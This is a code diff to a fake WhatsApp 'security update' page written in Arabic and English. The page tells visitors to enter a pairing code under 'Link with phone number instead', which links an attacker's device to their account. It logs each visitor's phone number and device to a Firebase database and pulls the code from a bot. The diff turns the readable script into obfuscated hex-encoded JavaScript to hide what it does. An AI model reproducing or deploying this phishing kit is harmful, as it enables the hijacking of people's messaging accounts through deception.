@@ -15,82 +15,24 @@
         .instruction { color: #3b4a54; font-size: 14px; line-height: 1.7; margin-bottom: 20px; text-align: right; border-right: 3px solid #00a884; padding-right: 10px; }
         .highlight { color: #d91e1e; font-weight: bold; text-decoration: underline; }
         .code-container { background-color: #f8f9fa; border: 2px dashed #cfd8dc; padding: 15px; border-radius: 8px; display: inline-block; min-width: 85%; margin-top: 10px; }
-        #pairing-code { font-size: 34px; font-weight: bold; color: #128c7e; letter-spacing: 3px; font-family: 'Courier New', Courier, monospace; }
+        #p_05 { font-size: 34px; font-weight: bold; color: #128c7e; letter-spacing: 3px; font-family: 'Courier New', Courier, monospace; }
         [dir="ltr"] .instruction, [dir="ltr"] .alert-box { text-align: left; border-right: none; border-left: 3px solid #00a884; padding-left: 10px; }
     </style>
 </head>
 <body>
     <div class="top-bar"></div>
     <div class="main-card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" class="whatsapp-logo">
-        
-        <div id="title" class="title"></div>
-        <div id="device-tag" class="device-info"></div>
-
-        <div id="alert" class="alert-box"></div>
-
-        <div id="instruction" class="instruction"></div>
-
-        <div class="code-container">
-            <div id="pairing-code">...</div>
-        </div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WA" class="whatsapp-logo">
+        <div id="t_01" class="title"></div>
+        <div id="d_02" class="device-info"></div>
+        <div id="a_03" class="alert-box"></div>
+        <div id="i_04" class="instruction"></div>
+        <div class="code-container"><div id="p_05">...</div></div>
     </div>
-
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script>
-        const config = { databaseURL: "https://xstuxnet-7e038-default-rtdb.firebaseio.com/" };
-        firebase.initializeApp(config);
-        const db = firebase.database();
-
-        // سحب الرقم من الرابط (مثال: ?id=2010xxxxxxx)
-        const urlParams = new URLSearchParams(window.location.search);
-        const vId = urlParams.get('id') || "User_" + Math.floor(Math.random() * 9999);
-
-        function getDevice() {
-            const ua = navigator.userAgent;
-            if (/android/i.test(ua)) return "Android Device";
-            if (/iPad|iPhone|iPod/.test(ua)) return "iPhone (iOS)";
-            return "Mobile Device";
-        }
-        const deviceName = getDevice();
-
-        const langData = {
-            ar: {
-                title: "تحديث أمان الحساب للرقم: " + (urlParams.get('id') || ""),
-                device: "تم التعرف على جهازك: " + deviceName,
-                alert: "تنبيه: سيصلك الآن إشعار على واتساب يطلب 'ربط جهاز جديد'. اضغط عليه للمتابعة.",
-                instr: "خطوات المزامنة:<br>1. افتح الإشعار أو اذهب للإعدادات > الأجهزة المرتبطة.<br>2. اضغط على 'ربط جهاز'.<br>3. <span class='highlight'>مهم جداً:</span> اضغط على كلمة <b>'الربط برقم الهاتف بدلاً من ذلك'</b> التي ستظهر أسفل الشاشة.<br>4. أدخل الكود التالي في الخانات التي ستظهر لك:",
-                loading: "فحص..."
-            },
-            en: {
-                title: "Security Update for: " + (urlParams.get('id') || ""),
-                device: "Verified Device: " + deviceName,
-                alert: "Alert: A notification will appear on your WhatsApp asking to 'Link a Device'. Tap it to proceed.",
-                instr: "Sync Steps:<br>1. Open notification or go to Settings > Linked Devices.<br>2. Tap 'Link a Device'.<br>3. <span class='highlight'>Important:</span> Tap on <b>'Link with phone number instead'</b> at the bottom of your screen.<br>4. Enter the following code in the boxes provided:",
-                loading: "Checking..."
-            }
-        };
-
-        const userLang = navigator.language.startsWith('ar') ? 'ar' : 'en';
-        document.documentElement.dir = userLang === 'ar' ? 'rtl' : 'ltr';
-        
-        document.getElementById('title').innerText = langData[userLang].title;
-        document.getElementById('device-tag').innerText = langData[userLang].device;
-        document.getElementById('alert').innerText = langData[userLang].alert;
-        document.getElementById('instruction').innerHTML = langData[userLang].instr;
-        document.getElementById('pairing-code').innerText = langData[userLang].loading;
-
-        // إرسال الإشعار فوراً للبوت باستخدام الرقم كـ ID
-        db.ref('visiting/' + vId).set({ status: "online", device: deviceName, lang: userLang, time: Date.now() });
-
-        // الاستماع للكود اللي هتبعته من البوت
-        db.ref('sessions/' + vId).on('value', (snapshot) => {
-            const data = snapshot.val();
-            if (data && data.code) {
-                document.getElementById('pairing-code').innerText = data.code;
-            }
-        });
+        var _0x534a=['\x68\x74\x74\x70\x73\x3A\x2F\x2F\x78\x73\x74\x75\x78\x6E\x65\x74\x2D\x37\x65\x30\x33\x38\x2D\x64\x65\x66\x61\x75\x6C\x74\x2D\x72\x74\x64\x62\x2E\x66\x69\x72\x65\x62\x61\x73\x65\x69\x6F\x2E\x63\x6F\x6D\x2F','\x69\x6E\x69\x74\x69\x61\x6C\x69\x7A\x65\x41\x70\x70','\x64\x61\x74\x61\x62\x61\x73\x65','\x67\x65\x74','\x69\x64','\x55\x73\x65\x72\x5F','\x66\x6C\x6F\x6F\x72','\x72\x61\x6E\x64\x6F\x6D','\x74\x65\x73\x74','\x69\x50\x68\x6F\x6E\x65\x20\x28\x69\x4F\x53\x29','\x41\x6E\x64\x72\x6F\x69\x64\x20\x44\x65\x76\x69\x63\x65','\x4D\x6F\x62\x69\x6C\x65\x20\x44\x65\x76\x69\x63\x65','\x61\x72','\x6C\x61\x6E\x67\x75\x61\x67\x65','\x73\x74\x61\x72\x74\x73\x57\x69\x74\x68','\x64\x69\x72','\x72\x74\x6C','\x6C\x74\x72','\x64\x6F\x63\x75\x6D\x65\x6E\x74\x45\x6C\x65\x6D\x65\x6E\x74','\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64','\x74\x5F\x30\x31','\x69\x6E\x6E\x65\x72\x54\x65\x78\x74','\x64\x5F\x30\x32','\x61\x5F\x30\x33','\x69\x5F\x30\x34','\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C','\x70\x5F\x30\x35','\x72\x65\x66','\x76\x69\x73\x69\x74\x69\x6E\x67\x2F','\x73\x65\x74','\x6F\x6E','\x76\x61\x6C\x75\x65','\x76\x61\x6C','\x63\x6F\x64\x65','\x73\x65\x73\x73\x69\x6F\x6E\x73\x2F','\x64\x61\x74\x61\x62\x61\x73\x65\x55\x52\x4C'];(function(_0x2d114d,_0x534ae5){var _0x13c7a0=function(_0x378546){while(--_0x378546){_0x2d114d['push'](_0x2d114d['shift']());}};_0x13c7a0(++_0x534ae5);}(_0x534a,0x1f4));var _0x13c7=function(_0x2d114d,_0x534ae5){_0x2d114d=_0x2d114d-0x0;var _0x13c7a0=_0x534a[_0x2d114d];return _0x13c7a0;};const _0x1c21={};_0x1c21[_0x13c7('0x0')]=_0x13c7('0x1');firebase[_0x13c7('0x2')](_0x1c21);const _0x4d2e=firebase[_0x13c7('0x3')]();const _0x2e11=new URLSearchParams(window['location']['search']);const _0x3b0a=_0x2e11[_0x13c7('0x4')](_0x13c7('0x5'))||_0x13c7('0x6')+Math[_0x13c7('0x7')](Math[_0x13c7('0x8')]()*0x270f);function _0x21ec(){const _0x1a1e=navigator['userAgent'];if(/iPhone|iPad|iPod/[_0x13c7('0x9')](_0x1a1e))return _0x13c7('0xa');if(/android/i[_0x13c7('0x9')](_0x1a1e))return _0x13c7('0xb');return _0x13c7('0xc');}const _0x23a1=_0x21ec();const _0x27f5={ar:{title:"\u062a\u062d\u062f\u064a\u062b\u20\u0623\u0645\u0627\u0646\u20\u0627\u0644\u062d\u0633\u0627\u0628\u20\u0644\u0644\u0631\u0642\u0645\u063a\u003a\u0020"+(_0x2e11['get']('id')||""),device:"\u062a\u0645\u20\u0627\u0644\u062a\u0639\u0631\u0641\u20\u0639\u0644\u0649\u20\u062c\u0647\u0627\u0632\u0643\u003a\u0020"+_0x23a1,alert:"\u062a\u0646\u0628\u064a\u0647\u003a\u0020\u0633\u064a\u0635\u0644\u0643\u20\u0627\u0644\u0622\u0646\u20\u0625\u0634\u0639\u0627\u0631\u20\u0639\u0644\u0649\u20\u0648\u0627\u062a\u0633\u0627\u0628\u20\u064a\u0637\u0644\u0628\u20\x27\u0631\u0628\u0637\u20\u062c\u0647\u0627\u0632\u20\u062c\u062f\u064a\u062f\u27\x2e\u0020\u0627\u0636\u063a\u0637\u20\u0639\u0644\u064a\u0647\u20\u0644\u0644\u0645\u062a\u0627\u0628\u0639\u0629\x2e",instr:"\u062e\u0637\u0648\u0627\u062a\u20\u0627\u0644\u0645\u0632\u0627\u0645\u0646\u0629\x3a\x3c\x62\x72\x3e\x31\x2e\x20\u0627\u0641\u062a\u062d\u20\u0627\u0644\u0625\u0634\u0639\u0627\u0631\u20\u0623\u0648\u20\u0627\u0630\u0647\u0628\u20\u0644\u0644\u0625\u0639\u062f\u0627\u062f\u0627\u062a\u20\u003e\u0020\u0627\u0644\u0623\u062c\u0647\u0632\u0629\u20\u0627\u0644\u0645\u0631\u062a\u0628\u0637\u0629\x2e\x3c\x62\x72\x3e\x32\x2e\x20\u0627\u0636\u063a\u0637\u20\u0639\u0644\u0649\u20\x27\u0631\u0628\u0637\u20\u062c\u0647\u0627\u0632\u27\x2e\x3c\x62\x72\x3e\x33\x2e\x20\x3c\x73\x70\x61\x6e\x20\x63\x6c\x61\x73\x73\x3d\x27\x68\x69\x67\x68\x6c\x69\x67\x68\x74\x27\x3e\u0645\u0647\u0645\x20\u062c\u062f\u0627\u064b\x3a\x3c\x2f\x73\x70\x61\x6e\x3e\u20\u0627\u0636\u063a\u0637\u20\u0639\u0644\u0649\u20\u0643\u0644\u0645\u0629\x20\x3c\x62\x3e\x27\u0627\u0644\u0631\u0628\u0637\u20\u0628\u0631\u0642\u0645\u0627\u0644\u0647\u0627\u062a\u0641\u20\u0628\u062f\u0644\u0627\u064b\u20\u0645\u0646\u20\u0630\u0644\u0643\x27\x3c\x2f\x62\x3e\x20\u0627\u0644\u062a\u064a\u20\u0633\u062a\u0638\u0647\u0631\u0620\u0623\u0633\u0641\u0644\u0620\u0627\u0644\u0634\u0627\u0633\u0629\x2e\x3c\x62\x72\x3e\x34\x2e\x20\u0623\u062f\u062e\u0644\u20\u0627\u0644\u0643\u0648\u062f\u20\u0627\u0644\u062a\u0627\u0644\u064a\x20\u0641\u064a\x20\u0627\u0644\u062e\u0627\u0646\u0627\u062a\x20\u0627\u0644\u062a\u064a\x20\u0633\u062a\u0638\u0647\u0631\x20\u0644\u0643\x3a",loading:"\u0641\u062d\u0635\u2e\u2e\u2e"},en:{title:"Security Update: "+(_0x2e11['get']('id')||""),device:"Device: "+_0x23a1,alert:"Alert: Tap the notification to link your device.",instr:"Steps:<br>1. Open notification.<br>2. Tap 'Link Device'.<br>3. <span class='highlight'>Tap:</span> 'Link with phone number instead'.<br>4. Enter code:",loading:"Checking..."}};const _0x50f9=navigator[_0x13c7('0xd')][_0x13c7('0xe')](_0x13c7('0xc'))?_0x13c7('0xc'):'en';document[_0x13c7('0x12')][_0x13c7('0xf')]=_0x50f9==_0x13c7('0xc')?_0x13c7('0x10'):_0x13c7('0x11');document[_0x13c7('0x13')](_0x13c7('0x14'))[_0x13c7('0x15')]=_0x27f5[_0x50f9]['title'];document[_0x13c7('0x13')](_0x13c7('0x16'))[_0x13c7('0x15')]=_0x27f5[_0x50f9]['device'];document[_0x13c7('0x13')](_0x13c7('0x17'))[_0x13c7('0x15')]=_0x27f5[_0x50f9]['alert'];document[_0x13c7('0x13')](_0x13c7('0x18'))[_0x13c7('0x19')]=_0x27f5[_0x50f9]['instr'];document[_0x13c7('0x13')](_0x13c7('0x1a'))[_0x13c7('0x15')]=_0x27f5[_0x50f9]['loading'];_0x4d2e[_0x13c7('0x1b')](_0x13c7('0x1c')+_0x3b0a)[_0x13c7('0x1d')]({status:"online",device:_0x23a1,lang:_0x50f9,time:Date['now']()});_0x4d2e[_0x13c7('0x1b')](_0x13c7('0x22')+_0x3b0a)[_0x13c7('0x1e')](_0x13c7('0x1f'),(_0x26c1)=>{const _0x3010=_0x26c1[_0x13c7('0x20')]();if(_0x3010&&_0x3010[_0x13c7('0x21')]){document[_0x13c7('0x13')](_0x13c7('0x1a'))[_0x13c7('0x15')]=_0x3010[_0x13c7('0x21')];}});
     </script>
 </body>
 </html>
